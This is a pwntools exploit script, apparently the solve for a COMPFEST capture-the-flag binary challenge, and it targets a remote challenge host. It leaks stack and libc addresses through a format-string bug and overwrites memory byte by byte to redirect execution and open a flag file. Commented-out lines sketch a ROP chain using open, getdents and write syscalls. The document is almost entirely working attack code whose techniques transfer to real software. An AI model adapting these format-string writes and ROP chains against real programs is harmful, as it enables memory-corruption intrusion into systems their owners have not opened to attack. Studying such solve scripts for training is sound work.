#!/usr/bin/python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                # b* 0x4017BD
                b* 0x4019AA
                b* 0x401808
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('challenges.ctf.compfest.id', 9008)
else:
    p = process(exe.path)

GDB()


def input(pa):
    sla(b'> ', b'2')
    sla(b'N) ', b'N')
    sla(b": ", pa)


def leak():
    return int(p.recvuntil("|", drop=True), 16)


def write(pa, len, addr, fmt=b"lln"):
    for i in range(len):
        res = (f'%{(pa>>(8*i))&0xff}c%12$'.encode() + fmt).ljust(0x10) + \
            flat(addr+i)
        input(res)


# write(u64(b'flag.txt'), 8, 0x404088)
# write(0x4088, 2, 0x404060)
input(b"%28$p|%33$p|")
p.recvuntil(b'song file ')
stack = leak() + 8
info("stack: " + hex(stack))
libc.address = leak() - 0x29d90
info("libc.address: " + hex(libc.address))
write(0x401882, 3, stack)
rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdx = rop.find_gadget(["pop rdx", "pop rbx", "ret"]).address
pop_rax = rop.find_gadget(["pop rax", "ret"]).address
syscall = rop.find_gadget(['syscall', 'ret']).address
# # write flag-7c76921b144b830737737d5d7f6dd4d7.txt
FLAG = 'dd4d7.txt'
write(u64(b'flag-7c7'), 8, 0x4040e0)
write(u64(b'6921b144'), 8, 0x4040e0+8)
write(u64(b'b8307377'), 8, 0x4040e0+8*2)
write(u64(b'37d5d7f6'), 8, 0x4040e0+8*3)
write(u64(b'dd4d7.tx'), 8, 0x4040e0+8*4)
write(u8(b't'), 1, 0x4040e0+8*5)
write(0x4040e0, 2, 0x404060, b"hhn")
input(b'flag-7c76921b144b830737737d5d7f6dd4d7.txt')


# # write /
# write(u8(b'/'), 1, 0x404088)
# write(0x4040e0, 2, 0x404060, b"hhn")
# # open
# write(pop_rdi,6, stack)
# write(0x404088,3, stack+8)
# write(pop_rsi, 6, stack+8*2)
# write(pop_rax, 6, stack+8*4)
# write(2, 1, stack+8*5)
# write(syscall, 6, stack+8*6)
# # getdents
# write(pop_rdi, 6, stack+8*7)
# write(3, 1, stack+8*8)
# write(pop_rsi, 6, stack+8*9)
# write(0x404800, 3, stack+8*10)
# write(pop_rdx, 6, stack+8*11)
# write(0x100, 2, stack+8*12)
# write(0x100, 2, stack+8*13)
# write(pop_rax, 6, stack+8*14)
# write(0x4e, 1, stack+8*15)
# write(syscall, 6, stack+8*16)
# # write
# write(pop_rdi, 6, stack+8*17)
# write(1, 1, stack+8*18)
# write(pop_rax, 6, stack+8*19)
# write(1, 1, stack+8*20)
# write(pop_rsi, 6, stack+8*21)
# write(0x404800, 3, stack+8*22)
# write(syscall, 6, stack+8*23)

# write(libc.sym.open, 6, stack+32)
p.interactive()
# flag-7c76921b144b830737737d5d7f6dd4d7.txt
